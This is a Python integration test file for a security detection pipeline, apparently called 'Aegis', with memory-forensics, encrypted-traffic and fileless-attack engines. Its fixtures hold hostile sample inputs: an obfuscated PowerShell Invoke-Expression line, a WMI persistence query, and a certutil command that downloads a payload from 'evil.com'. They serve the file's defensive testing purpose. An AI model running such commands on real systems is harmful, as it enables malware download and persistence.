"""Integration tests for Phase 24 — Advanced Detection Layer.

Tests the complete flow through DetectionPipeline with all three
new engines: MemoryForensics, EncryptedTraffic, FilelessDetector.
"""
from __future__ import annotations

from aegis.core.models import AegisEvent, SensorType
from aegis.detection.encrypted_traffic import EncryptedTrafficEngine
from aegis.detection.fileless_detector import FilelessDetector
from aegis.detection.memory_forensics import MemoryForensicsEngine
from aegis.detection.pipeline import DetectionPipeline


class TestPhase24Integration:
    """End-to-end tests wiring all three advanced engines into the pipeline."""

    def _make_pipeline(self) -> DetectionPipeline:
        """Create pipeline with all three advanced engines."""
        return DetectionPipeline(
            memory_forensics=MemoryForensicsEngine(),
            encrypted_traffic=EncryptedTrafficEngine(),
            fileless_detector=FilelessDetector(),
        )

    def test_obfuscated_powershell_triggers_alert(self) -> None:
        """Obfuscated PS script triggers fileless detector alert."""
        pipeline = self._make_pipeline()
        event = AegisEvent(
            sensor=SensorType.ETW,
            event_type="etw.powershell_scriptblock",
            data={
                "script_text": (
                    "I`nv`oke-`Exp`ress`ion "
                    "[System.Convert]::FromBase64String('dGVzdA==')"
                ),
                "pid": 1234,
                "script_block_id": "test-123",
            },
        )
        alerts = pipeline.process_event(event)
        assert len(alerts) >= 1
        assert any("powershell" in a.alert_type for a in alerts)

    def test_malicious_ja3_triggers_alert(self) -> None:
        """Known-bad JA3 triggers encrypted traffic alert."""
        pipeline = self._make_pipeline()
        # Load a test blacklist
        pipeline._encrypted_traffic.load_ja3_blacklist(
            {"abc123deadbeef"},
        )
        event = AegisEvent(
            sensor=SensorType.ETW,
            event_type="etw.tls_handshake",
            data={
                "server_name": "evil.com",
                "ja3_hash": "abc123deadbeef",
                "pid": 5678,
            },
        )
        alerts = pipeline.process_event(event)
        assert len(alerts) >= 1
        assert any("ja3" in a.alert_type for a in alerts)

    def test_fileless_dotnet_triggers_alert(self) -> None:
        """Dynamic .NET assembly with no path triggers fileless alert."""
        pipeline = self._make_pipeline()
        event = AegisEvent(
            sensor=SensorType.ETW,
            event_type="etw.dotnet_assembly_load",
            data={
                "assembly_name": "Evil.Payload",
                "module_il_path": "",
                "is_dynamic": True,
                "pid": 9999,
            },
        )
        alerts = pipeline.process_event(event)
        assert len(alerts) >= 1
        assert any("dotnet" in a.alert_type for a in alerts)

    def test_wmi_persistence_triggers_alert(self) -> None:
        """WMI subscription namespace triggers fileless alert."""
        pipeline = self._make_pipeline()
        event = AegisEvent(
            sensor=SensorType.ETW,
            event_type="etw.wmi_activity",
            data={
                "operation": "ExecMethod",
                "namespace": "root\\subscription",
                "query": "SELECT * FROM __EventFilter",
                "pid": 3333,
            },
        )
        alerts = pipeline.process_event(event)
        assert len(alerts) >= 1
        assert any("wmi" in a.alert_type for a in alerts)

    def test_normal_events_no_alerts(self) -> None:
        """Clean events should not trigger any advanced alerts."""
        pipeline = self._make_pipeline()

        clean_ps = AegisEvent(
            sensor=SensorType.ETW,
            event_type="etw.powershell_scriptblock",
            data={
                "script_text": "Get-Process | Format-Table",
                "pid": 1234,
            },
        )
        assert len(pipeline.process_event(clean_ps)) == 0

        clean_tls = AegisEvent(
            sensor=SensorType.ETW,
            event_type="etw.tls_handshake",
            data={
                "server_name": "google.com",
                "ja3_hash": "normal_hash",
                "pid": 5678,
            },
        )
        assert len(pipeline.process_event(clean_tls)) == 0

    def test_multiple_engines_on_same_event(self) -> None:
        """An event could trigger alerts from multiple engines."""
        pipeline = self._make_pipeline()
        # Office app spawning powershell triggers the fileless
        # detector's LOLBin parent-child check.
        event = AegisEvent(
            sensor=SensorType.PROCESS,
            event_type="process_new",
            data={
                "name": "powershell.exe",
                "parent_name": "winword.exe",
                "command_line": "powershell -enc ...",
                "pid": 4444,
            },
        )
        alerts = pipeline.process_event(event)
        # The fileless detector should fire for parent-child abuse
        assert len(alerts) >= 1

    def test_lolbin_certutil_download(self) -> None:
        """Certutil download pattern triggers fileless alert."""
        pipeline = self._make_pipeline()
        event = AegisEvent(
            sensor=SensorType.PROCESS,
            event_type="process_new",
            data={
                "name": "certutil.exe",
                "parent_name": "cmd.exe",
                "command_line": (
                    "certutil -urlcache -split -f "
                    "http://evil.com/payload.exe"
                ),
                "pid": 7777,
            },
        )
        alerts = pipeline.process_event(event)
        assert len(alerts) >= 1
